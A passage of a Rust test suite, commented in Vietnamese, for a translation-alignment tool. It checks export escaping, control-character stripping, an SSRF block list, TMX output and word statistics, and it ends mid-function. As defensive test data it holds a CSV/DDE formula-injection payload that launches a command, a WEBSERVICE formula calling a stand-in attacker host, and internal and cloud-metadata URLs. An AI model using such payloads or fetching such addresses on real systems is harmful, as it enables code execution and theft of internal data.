/// `none` và số liệu/khác đầu (chữ, số) KHÔNG bị thêm `'`.
fn t_export_formula_guard() -> Result<(), String> {
    let en0 = "=cmd|' /C calc'!A1 and =WEBSERVICE(\"http://evil.example/\") in one line.";
    let vi0 = "+3996 và -1975 là năm lịch sử; @home cũng bị coi là công thức.";
    let en1 = "Đoạn bình thường bắt đầu bằng chữ — không thêm gì.";
    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en0.into()),
            vi: Some(vi0.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::AutoMatched,
            score: Some(0.9),
        },
        Row {
            index: 1,
            en_index: None,
            vi_index: Some(1),
            en: None,
            vi: Some(en1.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
    ];
    let session = Session {
        id: "audit-formula".into(),
        title: "audit formula guard".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en0.into()],
        vietnamese: vec![vi0.into(), en1.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };

    // ---- CSV ----
    let csv = export_session(&session, ExportFormat::Csv)?.content;
    for line in csv.lines() {
        if line.starts_with("index,") {
            continue; // header
        }
        // các trường dữ liệu (en, vi) phải bắt đầu bằng ' khi nội dung gốc bắt đầu = + - @
        // dòng 1: "0,auto_matched,0.900,\"'=cmd|…\",\"'+3996…\""
        if line.starts_with("0,") {
            if !line.contains("\"'=cmd|") {
                return Err(format!(
                    "CSV: ô EN bắt đầu '=' phải có guard `'` — dòng: {}",
                    line
                ));
            }
            // ô VI không chứa , " \n nên RFC4180 không bọc quotes — guard `'+` theo sau dấu phẩy
            if !line.contains(",'+3996") {
                return Err(format!(
                    "CSV: ô VI bắt đầu '+' phải có guard `'` — dòng: {}",
                    line
                ));
            }
        }
        // dòng 2: ô EN là `none` (nguyên văn, KHÔNG guard), ô VI bắt đầu bằng chữ
        if line.starts_with("1,") {
            if !line.contains(",none,") {
                return Err(format!(
                    "CSV: `none` phải nguyên văn không guard — dòng: {}",
                    line
                ));
            }
            if line.contains("'Đoạn") || line.contains("'Đ") {
                return Err("CSV: ô bắt đầu bằng chữ thường không được thêm `'`".into());
            }
        }
    }
    // − và −@ trong THÂN chuỗi (không đầu ô) không bị thêm gì — kiểm nguyên văn một phần
    if !csv.contains("=WEBSERVICE") {
        return Err("CSV: phần thân ô vẫn giữ nguyên văn bản (chỉ đầu ô được guard)".into());
    }

    // ---- TSV ----
    let tsv = export_session(&session, ExportFormat::Tsv)?.content;
    let mut lines = tsv.lines();
    let l1 = lines.next().unwrap_or_default();
    if !l1.starts_with("'=cmd|") {
        return Err(format!(
            "TSV: ô EN đầu tiên phải bắt đầu bằng guard `'` — dòng: {}",
            l1
        ));
    }
    if !l1.contains("\t'+3996") {
        return Err(format!(
            "TSV: ô VI bắt đầu '+' phải có guard `'` — dòng: {}",
            l1
        ));
    }
    let l2 = lines.next().unwrap_or_default();
    if !l2.starts_with("none\t") {
        return Err(format!("TSV: `none` phải nguyên văn ở đầu — dòng: {}", l2));
    }
    if l2.contains("'Đoạn") {
        return Err("TSV: ô bắt đầu bằng chữ không được thêm `'`".into());
    }
    Ok(())
}

/// 37. [AUDIT 2026-10-18] XLSX ghi CHUỖI, không phải công thức: đoạn bắt đầu bằng
/// `=` (vd "=1+1") phải nằm trong sharedStrings (kiểu chuỗi) và sheet KHÔNG có
/// phần tử `<f>` (formula) — mở file không bao giờ thực thi gì.
fn t_export_xlsx_no_formula() -> Result<(), String> {
    let en0 = "=1+1 looks like a formula but is just translated text here.";
    let vi0 = "=1+1 trông như công thức nhưng chỉ là văn bản dịch.";
    let rows = vec![Row {
        index: 0,
        en_index: Some(0),
        vi_index: Some(0),
        en: Some(en0.into()),
        vi: Some(vi0.into()),
        en_extra: Vec::new(),
        vi_extra: Vec::new(),
        status: Status::AutoMatched,
        score: Some(0.9),
    }];
    let session = Session {
        id: "audit-xlsxformula".into(),
        title: "audit xlsx formula".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en0.into()],
        vietnamese: vec![vi0.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };
    let r = export_session(&session, ExportFormat::Xlsx)?;
    let bytes = r.bytes.as_ref().ok_or("xlsx phải trả bytes")?;
    let sheet = zip_read(bytes, "xl/worksheets/sheet1.xml")?;
    let shared = zip_read(bytes, "xl/sharedStrings.xml")?;
    if sheet.contains("<f>") || sheet.contains("<f ") {
        return Err("sheet1.xml không được chứa phần tử <f> (formula)".into());
    }
    // chuỗi "=1+1" phải được ghi là chuỗi dùng chung (đã escape &lt; không cần, chỉ =)
    if !shared.contains("=1+1") {
        return Err("sharedStrings phải chứa nguyên văn chuỗi '=1+1'".into());
    }
    // ô chứa nó phải là kiểu chuỗi (t=\"s\" hoặc t=\"inlineStr\"), không phải công thức
    if !sheet.contains("t=\"s\"") {
        return Err("ô dữ liệu phải mang kiểu chuỗi t=\"s\"".into());
    }
    Ok(())
}

/// 38. [AUDIT 2026-10-18] KÝ TỰ ĐIỀU KHIỂN: văn bản chứa 0x01, 0x0B, 0x7F…
/// (dán từ PDF/Word) — XLIFF/HTML/CSV xuất ra phải KHÔNG còn ký tự điều khiển
/// (XLIFF 1.2 hợp lệ), còn chữ thường thì giữ nguyên.
fn t_export_control_chars() -> Result<(), String> {
    let dirty_en = format!(
        "Clean text with control\u{0001}chars and\u{000B}vertical tab and\u{007F}del inside."
    );
    let dirty_vi =
        format!("Văn bản kèm\u{0001}điều khiển và\u{000B}tab-dọc và\u{007F}del bên trong.");
    let rows = vec![Row {
        index: 0,
        en_index: Some(0),
        vi_index: Some(0),
        en: Some(dirty_en.clone()),
        vi: Some(dirty_vi.clone()),
        en_extra: Vec::new(),
        vi_extra: Vec::new(),
        status: Status::AutoMatched,
        score: Some(0.9),
    }];
    let session = Session {
        id: "audit-ctrl".into(),
        title: "audit control chars".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![dirty_en],
        vietnamese: vec![dirty_vi],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };
    let has_ctrl = |s: &str| {
        s.chars().any(|c| {
            let u = c as u32;
            (u < 0x20 && c != '\n' && c != '\r' && c != '\t') || u == 0x7f
        })
    };
    for fmt in [
        ExportFormat::Xliff,
        ExportFormat::Html,
        ExportFormat::Csv,
        ExportFormat::Tsv,
    ] {
        let out = export_session(&session, fmt)?;
        if has_ctrl(&out.content) {
            return Err(format!(
                "{:?}: vẫn còn ký tự điều khiển trong file xuất",
                fmt
            ));
        }
        if !out.content.contains("Clean text with control chars") {
            return Err(format!(
                "{:?}: chữ thường phải giữ nguyên (đã thay ctrl bằng space)",
                fmt
            ));
        }
    }
    // XLIFF phải parse được (kiểm nhanh: mở/két thẻ xliff + trans-unit + source/target cân nhau)
    let xliff = export_session(&session, ExportFormat::Xliff)?.content;
    if xliff.matches("<trans-unit").count() != 1 || xliff.matches("</trans-unit>").count() != 1 {
        return Err("XLIFF: số thẻ trans-unit mở/không khớp".into());
    }
    if xliff.matches('<').count() != xliff.matches('>').count() {
        return Err("XLIFF: số dấu < và > không cân — nghi escape hỏng".into());
    }
    Ok(())
}

/// 39. [AUDIT 2026-10-18] CHỐNG SSRF: tải URL trỏ về địa chỉ nội bộ (loopback /
/// private / link-local / IPv6 loopback) phải bị CHẶN với thông báo rõ — dùng IP
/// literal nên không chạm mạng. Phân giải redirect (hàm thuần) đúng mọi dạng.
fn t_fetch_ssrf_guard() -> Result<(), String> {
    for url in [
        "http://127.0.0.1:3031/embed",
        "http://localhost/",
        "http://[::1]:8080/",
        "http://10.0.0.5/",
        "http://172.16.1.1/",
        "http://192.168.1.1/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://100.64.0.1/",
        "http://0.0.0.0/",
        "ftp://example.com/",
    ] {
        match fetcher::fetch(url) {
            Ok(_) => return Err(format!("SSRF: {} phải bị chặn mà tải được", url)),
            Err(e) => {
                // chặn phải vì lý do an toàn/giao thức, không phải vì mạng
                if !e.contains("nội bộ") && !e.contains("http://") && !e.contains("phân giải")
                {
                    return Err(format!("{} bị lỗi vì lý do khác: {}", url, e));
                }
            }
        }
    }
    // hàm phân giải redirect (thuần, không mạng)
    use fetcher::resolve_redirect_for_test as rr;
    if rr("https://a.example/x/y", "https://b.example/z") != Some("https://b.example/z".into()) {
        return Err("redirect tuyệt đối sai".into());
    }
    if rr("https://a.example/x/y", "//b.example/z") != Some("https://b.example/z".into()) {
        return Err("redirect scheme-relative sai".into());
    }
    if rr("https://a.example/x/y", "/root") != Some("https://a.example/root".into()) {
        return Err("redirect root-relative sai".into());
    }
    if rr("https://a.example/dir/page?q=1", "next") != Some("https://a.example/dir/next".into()) {
        return Err("redirect tương đối sai".into());
    }
    if rr("https://a.example/dir/page", "../up") != Some("https://a.example/up".into()) {
        return Err("redirect '..' sai".into());
    }
    if rr("https://a.example/dir/page", "") != None {
        return Err("Location rỗng phải trả None".into());
    }
    // host:port parser (trả Result — so qua .ok())
    use fetcher::url_host_port_for_test as hp;
    if hp("http://example.com/a?b").ok() != Some(("example.com".into(), 80)) {
        return Err("url_host_port: host/port mặc định sai".into());
    }
    if hp("https://example.com:8443/x").ok() != Some(("example.com".into(), 8443)) {
        return Err("url_host_port: cổng tuỳ chỉnh sai".into());
    }
    if hp("http://user:pass@10.1.2.3:999/x").ok() != Some(("10.1.2.3".into(), 999)) {
        return Err("url_host_port: bỏ userinfo sai".into());
    }
    if hp("http://[2001:db8::1]:8080/x").ok() != Some(("2001:db8::1".into(), 8080)) {
        return Err("url_host_port: IPv6 ngoặc vuông sai".into());
    }
    Ok(())
}

/// 40. [BẢN 2.8] Xuất TMX 1.2 — bộ nhớ dịch cho CAT tool (OmegaT/Trados…):
/// header đủ thuộc tính bắt buộc (creationtool, segtype, srclang, datatype,
/// o-tmf, adminlang, creationdate dạng YYYYMMDDTHHMMSSZ), mỗi hàng một <tu> với
/// 2 <tuv xml:lang>, trạng thái/điểm trong <prop>, phía thiếu ghi đúng chữ `none`,
/// XML escape đúng, thẻ cân nhau.
fn t_export_tmx() -> Result<(), String> {
    if ExportFormat::parse("tmx") != Some(ExportFormat::Tmx) {
        return Err("parse phải nhận 'tmx'".into());
    }
    if ExportFormat::Tmx.ext() != "tmx" || ExportFormat::Tmx.is_binary() {
        return Err("ext/is_binary của Tmx sai".into());
    }
    if !ExportFormat::Tmx.mime().contains("tmx") {
        return Err("mime của Tmx phải nhắc tmx".into());
    }
    let en0 = "Hanoi hosted the summit & signed deals with 32 countries.";
    let vi0 = "Hà Nội tổ chức hội nghị và ký kết với 32 quốc gia.";
    let en1 = "Row without Vietnamese translation stays unmatched.";
    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en0.into()),
            vi: Some(vi0.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::AutoMatched,
            score: Some(0.85),
        },
        Row {
            index: 1,
            en_index: Some(1),
            vi_index: None,
            en: Some(en1.into()),
            vi: None,
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
    ];
    let session = Session {
        id: "tmx-test".into(),
        title: "tmx test".into(),
        created_at: 1,
        updated_at: 1760000000000, // cố định để kiểm creationdate
        english: vec![en0.into(), en1.into()],
        vietnamese: vec![vi0.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };
    let r = export_session(&session, ExportFormat::Tmx)?;
    if !r.filename.ends_with(".tmx") {
        return Err(format!("tên file phải .tmx, được {}", r.filename));
    }
    if r.rows != 2 || r.none_count != 1 {
        return Err(format!(
            "rows/none phải 2/1, được {}/{}",
            r.rows, r.none_count
        ));
    }
    let tmx = r.content;
    // header TMX 1.2 với các thuộc tính bắt buộc
    for attr in [
        "creationtool=\"reva-tool\"",
        "segtype=\"paragraph\"",
        "srclang=\"en\"",
        "datatype=\"plaintext\"",
        "o-tmf=\"reva-aligned\"",
        "adminlang=\"en\"",
    ] {
        if !tmx.contains(attr) {
            return Err(format!("header TMX thiếu {}", attr));
        }
    }
    // creationdate dạng YYYYMMDDTHHMMSSZ (14 chữ số + T + Z)
    let cd = tmx
        .split("creationdate=\"")
        .nth(1)
        .and_then(|s| s.split('"').next())
        .unwrap_or("");
    if cd.len() != 16
        || !cd.starts_with(|c: char| c.is_ascii_digit())
        || !cd.contains('T')
        || !cd.ends_with('Z')
    {
        return Err(format!("creationdate phải YYYYMMDDTHHMMSSZ, được {:?}", cd));
    }
    // 2 tu, mỗi tu 2 tuv; xml:lang en/vi đủ
    if tmx.matches("<tu ").count() != 2 {
        return Err("phải có đúng 2 <tu>".into());
    }
    if tmx.matches("<tuv xml:lang=\"en\">").count() != 2
        || tmx.matches("<tuv xml:lang=\"vi\">").count() != 2
    {
        return Err("mỗi tu phải có 1 tuv en + 1 tuv vi".into());
    }
    // trạng thái + điểm trong prop
    if !tmx.contains("<prop type=\"x-status\">auto_matched</prop>") {
        return Err("thiếu prop x-status".into());
    }
    if !tmx.contains("<prop type=\"x-score\">0.850</prop>") {
        return Err("thiếu prop x-score đúng định dạng".into());
    }
    // phía thiếu ghi đúng chữ none trong <seg>
    if tmx.matches("<seg>none</seg>").count() != 1 {
        return Err("phía thiếu phải ghi đúng chữ none trong <seg>".into());
    }
    // XML escape: '&' trong en0 phải thành &amp;
    if !tmx.contains("summit &amp; signed") {
        return Err("TMX phải escape '&' thành &amp;".into());
    }
    // thẻ cân nhau + XML khai báo đúng chỗ
    if tmx.matches('<').count() != tmx.matches('>').count() {
        return Err("số dấu < và > không cân — nghi escape hỏng".into());
    }
    if !tmx.starts_with("<?xml version=\"1.0\" encoding=\"UTF-8\"?>") {
        return Err("thiếu khai báo XML".into());
    }
    // tuid phải theo id phiên + số thứ tự
    if !tmx.contains("tuid=\"tmx-test-1\"") || !tmx.contains("tuid=\"tmx-test-2\"") {
        return Err("tuid phải dạng <id phiên>-<số thứ tự>".into());
    }
    Ok(())
}

/// 41. [BẢN 2.8] RESCAN TOÀN BỘ: chấm lại mọi hàng đủ hai phía (hàng một phía bỏ
/// qua), MỘT snapshot hoàn tác cho cả lô — Ctrl+Z một nhấn trả nguyên điểm/trạng
/// thái cũ của TẤT CẢ hàng; làm lại (redo) áp lại cả lô.
fn t_rescan_all() -> Result<(), String> {
    let en0 = "Hanoi hosted the Green Tech Summit 2025 with 4,000 guests.";
    let vi0 = "Hà Nội tổ chức Hội nghị Công nghệ Xanh 2025 với 4.000 khách.";
    let en1 = "Second paragraph mentions Siemens and 120 million euros.";
    let vi1 = "Đoạn thứ hai nhắc tới Siemens và 120 triệu euro.";
    let en2 = "English only row without any Vietnamese counterpart here.";
    let rows = vec![
        Row {
            index: 0,
            en_index: Some(0),
            vi_index: Some(0),
            en: Some(en0.into()),
            vi: Some(vi0.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::NeedsReview,
            score: None, // giả lập: đã kéo–thả nên mất điểm, chờ rescan
        },
        Row {
            index: 1,
            en_index: Some(1),
            vi_index: Some(1),
            en: Some(en1.into()),
            vi: Some(vi1.into()),
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::NeedsReview,
            score: None,
        },
        Row {
            index: 2,
            en_index: Some(2),
            vi_index: None,
            en: Some(en2.into()),
            vi: None,
            en_extra: Vec::new(),
            vi_extra: Vec::new(),
            status: Status::Unmatched,
            score: None,
        },
    ];
    let mut s = Session {
        id: "rescan-all-test".into(),
        title: "rescan all".into(),
        created_at: 1,
        updated_at: 1,
        english: vec![en0.into(), en1.into(), en2.into()],
        vietnamese: vec![vi0.into(), vi1.into()],
        rows,
        options: AlignOptions {
            auto_threshold: 0.30,
        },
        engine: "lexical".into(),
        reordered: false,
        undo_stack: Vec::new(),
        redo_stack: Vec::new(),
    };
    // lưu trạng thái gốc để đối chiếu hoàn tác
    let orig_scores: Vec<Option<f64>> = s.rows.iter().map(|r| r.score).collect();
    let orig_statuses: Vec<Status> = s.rows.iter().map(|r| r.status).collect();

    // BẢN 2.8.1 — TIÊM nguồn cosine = None (mô phỏng máy không LaBSE) thay vì
    // trông chờ môi trường: bài kiểm phải ĐẠT kể cả khi LaBSE thật đang chạy
    // (lỗi 39/41 trên máy người dùng: labse_used=true chỉ vì dịch vụ ambient).
    let (count, labse_used) = s.rescan_all_with(&|_, _| None)?;
    if count != 2 {
        return Err(format!(
            "rescan_all phải chấm 2 hàng đủ hai phía, được {}",
            count
        ));
    }
    // nguồn tiêm None → labse_used phải false (xác định, không phụ thuộc máy)
    if labse_used {
        return Err("nguồn tiêm None (không LaBSE) → labse_used phải là false".into());
    }
    for i in 0..2 {
        if s.rows[i].score.is_none() {
            return Err(format!("hàng {} phải có điểm sau rescan_all", i));
        }
    }
    // hàng một phía (index 2) KHÔNG bị chấm — giữ nguyên unmatched, không có điểm
    if s.rows[2].status != Status::Unmatched || s.rows[2].score.is_some() {
        return Err("hàng một phía phải được bỏ qua nguyên vẹn".into());
    }
    // MỘT snapshot: undo_stack dài đúng 1 (không phải 2 như khi bấm từng hàng)
    if s.undo_stack.len() != 1 {
        return Err(format!(
            "rescan_all phải đẩy đúng 1 snapshot hoàn tác, được {}",
            s.undo_stack.len()
        ));
    }
    // HOÀN TÁC 1 nhấn → nguyên xi điểm + trạng thái cũ của CẢ LÔ
    s.undo()?;
    for i in 0..3 {
        if s.rows[i].score != orig_scores[i] || s.rows[i].status != orig_statuses[i] {
            return Err(format!(
                "sau undo, hàng {} phải trả nguyên trạng thái/điểm cũ",
                i
            ));
        }
    }
    // LÀM LẠI → cả lô được chấm lại như trước undo
    s.redo()?;
    if s.rows[0].score.is_none() || s.rows[1].score.is_none() {
        return Err("sau redo, hai hàng phải có điểm lại".into());
    }
    // BẢN 2.8.1 — đường CÓ LaBSE (tiêm cos=1): labse_used=true, điểm cả lô
    // chỉ được NÂNG so với đường thuần từ vựng (hoà trộn chỉ-nâng không hạ).
    let scores_before: Vec<Option<f64>> = s.rows.iter().map(|r| r.score).collect();
    let (count_hi, labse_used_hi) = s.rescan_all_with(&|_, _| Some(1.0))?;
    if count_hi != 2 || !labse_used_hi {
        return Err(format!(
            "nguồn tiêm Some(cos=1) → chấm đủ 2 hàng và labse_used=true, được {} / {}",
            count_hi, labse_used_hi
        ));
    }
    for i in 0..2 {
        let lo = scores_before[i].unwrap_or(0.0);
        let hi = s.rows[i].score.unwrap_or(0.0);
        if hi + 1e-9 < lo {
            return Err(format!(
                "rescan_all hoà trộn cos=1 chỉ được NÂNG điểm hàng {}: {:.3} < {:.3}",
                i, hi, lo
            ));
        }
    }
    // phiên chỉ có hàng một phía → báo lỗi rõ (không chặn hình)
    let mut only_one = s.clone();
    only_one.rows = vec![only_one.rows[2].clone()];
    if only_one.rescan_all().is_ok() {
        return Err("phiên không hàng nào đủ hai phía phải báo lỗi".into());
    }
    Ok(())
}

// ========================= BẢN 2.9: thống kê số từ (căn cứ tính giá) =========================

/// 42. [BẢN 2.9] Thống kê corpus chuẩn ra đúng SỐ ĐẾM TAY (đếm độc lập bằng Python
///     trên đúng bộ ngữ liệu ở đầu file này): Anh 164 từ / 1.123 ký tự / 10 đoạn;
///     Việt 203 từ / 916 ký tự / 9 đoạn (thiếu đoạn 7). Phân vùng hàng bảo toàn:
///     paired + en_only + vi_only đếm đủ mỗi đoạn đúng 1 lần; by_status = counts().
fn t_stats_counts_corpus() -> Result<(), String> {
    let store = temp_store("stats1");
    let s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let rep = stats::report(&s);
    if rep.en.segments != 10 || rep.en.words != 164 || rep.en.chars != 1123 {
        return Err(format!(
            "thống kê phía Anh sai: {} đoạn / {} từ / {} ký tự (kỳ vọng 10 / 164 / 1123)",
            rep.en.segments, rep.en.words, rep.en.chars
        ));
    }
    if rep.vi.segments != 9 || rep.vi.words != 203 || rep.vi.chars != 916 {
        return Err(format!(
            "thống kê phía Việt sai: {} đoạn / {} từ / {} ký tự (kỳ vọng 9 / 203 / 916)",
            rep.vi.segments, rep.vi.words, rep.vi.chars
        ));
    }
    // 10 đoạn Anh × 9 đoạn Việt (thiếu bản dịch đoạn 7) → 9 cặp + 1 hàng EN-only = 10 hàng
    if rep.rows != 10 {
        return Err(format!("phiên phải có 10 hàng, được {}", rep.rows));
    }
    if rep.paired.rows != 9 || rep.en_only.rows != 1 || rep.vi_only.rows != 0 {
        return Err(format!(
            "phân vùng sai: paired {} / en_only {} / vi_only {} (kỳ vọng 9 / 1 / 0)",
            rep.paired.rows, rep.en_only.rows, rep.vi_only.rows
        ));
    }
    // BẢO TOÀN: mỗi từ được đếm đúng 1 lần — tổng các vùng = tổng tài liệu gốc
    if rep.paired.en_words + rep.en_only.words != rep.en.words {
        return Err("từ Anh: paired + en_only phải bằng tổng tài liệu".into());
    }
    if rep.paired.vi_words + rep.vi_only.words != rep.vi.words {
        return Err("từ Việt: paired + vi_only phải bằng tổng tài liệu".into());
    }
    // by_status khớp counts() của phiên và cộng gộp đúng tổng hàng
    let c = s.counts();
    let bs = &rep.by_status;
    if bs.total != c.total
        || bs.auto_matched != c.auto_matched
        || bs.needs_review != c.needs_review
        || bs.unmatched != c.unmatched
        || bs.human_confirmed != c.human_confirmed
    {
        return Err("byStatus phải trùng counts() của phiên".into());
    }
    if bs.auto_matched + bs.needs_review + bs.unmatched + bs.human_confirmed != bs.total {
        return Err("4 trạng thái cộng lại phải bằng tổng số hàng".into());
    }
    Ok(())
}

/// 43. [BẢN 2.9] Quy ước đếm ở BIÊN: NFD và NFC cho CÙNG số từ lẫn số ký tự (chuẩn hoá
///     NFC trong count_chars — dán từ macOS hay Windows đều ra một con số); CRLF/NBSP không
///     thổi phồng số từ; emoji ghép ZWJ tính 1 từ; chuỗi toàn khoảng trắng = 0/0; trim ký tự.
fn t_stats_nfd_crlf_edge() -> Result<(), String> {
    let nfc = "Tiếng Việt dễ đọc quá!";
    let nfd: String = nfc.nfd().collect();
    if nfd == nfc {
        return Err("chuỗi NFD phải khác byte NFC — kiểm tra này phải thử NFD thật".into());
    }
    // NFD vs NFC: CÙNG số từ + CÙNG số ký tự (5 từ / 22 ký tự sau NFC)
    if stats::count_words(&nfd) != 5 || stats::count_words(nfc) != 5 {
        return Err(format!(
            "NFD/NFC phải cùng 5 từ, được {} / {}",
            stats::count_words(&nfd),
            stats::count_words(nfc)
        ));
    }
    if stats::count_chars(&nfd) != stats::count_chars(nfc) {
        return Err(format!(
            "NFD ({}) và NFC ({}) phải cùng số ký tự sau chuẩn hoá NFC",
            stats::count_chars(&nfd),
            stats::count_chars(nfc)
        ));
    }
    if stats::count_chars(nfc) != 22 {
        return Err(format!(
            "số ký tự NFC phải là 22, được {}",
            stats::count_chars(nfc)
        ));
    }
    // CRLF ở GIỮA đoạn không đếm thêm từ (4 từ, không phải 5+)
    if stats::count_words("alpha beta\r\ngamma delta") != 4 {
        return Err("CRLF giữa đoạn không được thổi phồng số từ".into());
    }
    // NBSP là khoảng trắng Unicode → "một hai" là 2 từ
    if stats::count_words("một\u{00a0}hai") != 2 {
        return Err("NBSP (U+00A0) phải được coi là khoảng trắng — 2 từ".into());
    }
    // emoji gia đình ghép ZWJ (7 scalar) = 1 từ; câu gồm emoji + "gia đình" = 3 từ
    if stats::count_words("\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}\u{200d}\u{1f466} gia đình")
        != 3
    {
        return Err("emoji ghép ZWJ phải tính là 1 từ (cả câu = 3 từ)".into());
    }
    // chuỗi toàn khoảng trắng → 0 từ 0 ký tự (không lỗi)
    if stats::count_words(" \t \n ") != 0 || stats::count_chars(" \t\n ") != 0 {
        return Err("chuỗi toàn khoảng trắng phải đếm 0 từ / 0 ký tự".into());
    }
    // khoảng trắng đầu/cuối không tính vào ký tự
    if stats::count_chars("  halo  ") != 4 {
        return Err("count_chars phải trim khoảng trắng đầu/cuối".into());
    }
    if stats::count_chars("Hello") != 5 {
        return Err("chuỗi ASCII thuần phải đếm đúng từng ký tự".into());
    }
    // cấp PHIÊN: hai phiên chỉ khác nhau NFD vs NFC phải ra cùng báo cáo từ/ký tự
    let en = vec![
        "Alpha beta gamma".to_string(),
        "Delta epsilon zeta".to_string(),
    ];
    let vi_nfc = vec![
        "Bản dịch đầy đủ dấu tiếng Việt".to_string(),
        "Đoạn thứ hai đấy".to_string(),
    ];
    let vi_nfd: Vec<String> = vi_nfc.iter().map(|t| t.nfd().collect()).collect();
    let rows_nfc = vec![pair_row(0, 0, &en, &vi_nfc, Status::NeedsReview, None)];
    let rows_nfd = vec![pair_row(0, 0, &en, &vi_nfd, Status::NeedsReview, None)];
    let r_nfc = stats::report(&manual_session(en.clone(), vi_nfc, rows_nfc));
    let r_nfd = stats::report(&manual_session(en, vi_nfd, rows_nfd));
    if r_nfc.vi.words != r_nfd.vi.words || r_nfc.vi.chars != r_nfd.vi.chars {
        return Err(format!(
            "hai phiên NFC vs NFD phải cùng số từ/ký tự: {}/{} vs {}/{}",
            r_nfc.vi.words, r_nfc.vi.chars, r_nfd.vi.words, r_nfd.vi.chars
        ));
    }
    Ok(())
}

/// 44. [BẢN 2.9] Phân vùng hàng phản ánh đúng thao tác: phiên dựng tay 2 cặp +
///     1 hàng EN-only + 1 hàng VI-only; tách cặp (✕ Không khớp) → paired giảm,
///     hai hàng đơn phía xuất hiện; by_status đếm đúng từng bước; bảo toàn từ.
fn t_stats_rows_partition() -> Result<(), String> {
    let en = vec![
        "Alpha beta gamma".to_string(),
        "Delta epsilon".to_string(),
        "Zeta only en".to_string(),
    ];
    let vi = vec![
        "Mô tả ba từ".to_string(),
        "Hai từ rồi".to_string(),
        "Ôi vi only".to_string(),
    ];
    let rows = vec![
        pair_row(0, 0, &en, &vi, Status::AutoMatched, Some(0.5)),
        pair_row(1, 1, &en, &vi, Status::HumanConfirmed, Some(0.9)),
        Row::single_side(Some((2, en[2].clone())), None, Status::Unmatched),
        Row::single_side(None, Some((2, vi[2].clone())), Status::Unmatched),
    ];
    let mut s = manual_session(en, vi, rows);
    let rep = stats::report(&s);
    if rep.rows != 4 || rep.paired.rows != 2 || rep.en_only.rows != 1 || rep.vi_only.rows != 1 {
        return Err(format!(
            "phân vùng ban đầu sai: rows {} / paired {} / en_only {} / vi_only {}",
            rep.rows, rep.paired.rows, rep.en_only.rows, rep.vi_only.rows
        ));
    }
    if rep.paired.en_words != 3 + 2 || rep.en_only.words != 3 || rep.vi_only.words != 3 {
        return Err("số từ từng vùng phải đúng văn bản của vùng đó".into());
    }
    let bs = &rep.by_status;
    if bs.auto_matched != 1 || bs.human_confirmed != 1 || bs.unmatched != 2 || bs.total != 4 {
        return Err(format!(
            "byStatus sai: auto {} / human {} / unmatched {} / total {}",
            bs.auto_matched, bs.human_confirmed, bs.unmatched, bs.total
        ));
    }
    // TÁCH cặp đầu (✕ Không khớp) → 2 hàng đơn phía mới: 1 cặp + 2 EN-only + 2 VI-only
    s.set_row_status(0, Status::Unmatched)
        .map_err(|e| format!("tách cặp phải được: {}", e))?;
    let rep2 = stats::report(&s);
    if rep2.rows != 5 || rep2.paired.rows != 1 || rep2.en_only.rows != 2 || rep2.vi_only.rows != 2 {
        return Err(format!(
            "sau tách cặp: rows {} / paired {} / en_only {} / vi_only {} (kỳ vọng 5/1/2/2)",
            rep2.rows, rep2.paired.rows, rep2.en_only.rows, rep2.vi_only.rows
        ));
    }
    // bảo toàn sau thao tác: 8 từ Anh = paired(2) + en_only(3+3)
    if rep2.paired.en_words + rep2.en_only.words != 8 {
        return Err("sau tách, tổng từ Anh các vùng vẫn phải bằng tài liệu gốc".into());
    }
    let bs2 = &rep2.by_status;
    if bs2.unmatched != 4 || bs2.human_confirmed != 1 || bs2.total != 5 {
        return Err(format!(
            "byStatus sau tách sai: unmatched {} / human {} / total {}",
            bs2.unmatched, bs2.human_confirmed, bs2.total
        ));
    }
    Ok(())
}

/// 45. [BẢN 2.9] Thuần đọc + hiệu năng: report() không đổi gì phiên (JSON hàng
///     trước/sau TRÙNG NHAU, undo_stack rỗng, updated_at giữ nguyên) và phiên 10.000
///     cặp đoạn chạy dưới 300 ms (ngân sách hiệu năng trong spec).
fn t_stats_readonly_perf() -> Result<(), String> {
    let store = temp_store("stats3");
    let s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let before = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    let before_upd = s.updated_at;
    let _ = stats::report(&s);
    let after = serde_json::to_string(&s.rows).map_err(|e| e.to_string())?;
    if before != after {
        return Err("report() phải THUẦN ĐỌC — không được thay đổi hàng nào".into());
    }
    if !s.undo_stack.is_empty() || !s.redo_stack.is_empty() {
        return Err("report() không được đẩy snapshot hoàn tác".into());
    }
    if s.updated_at != before_upd {
        return Err("report() không được đổi updated_at của phiên".into());
    }
    // 10.000 cặp đoạn — dựng thẳng hàng (không qua bộ ghép) để tất định và nhanh
    let n = 10_000usize;
    let en: Vec<String> = (0..n)
        .map(|k| {
            format!(
                "Report {} says Alpha Corp shipped {} units worth {} million dollars.",
                k,
                100 + k,
                10 + k
            )
        })
        .collect();
    let vi: Vec<String> = (0..n)
        .map(|k| {
            format!(
                "Báo cáo {} cho biết Alpha Corp đã xuất {} sản phẩm trị giá {} triệu đô la.",
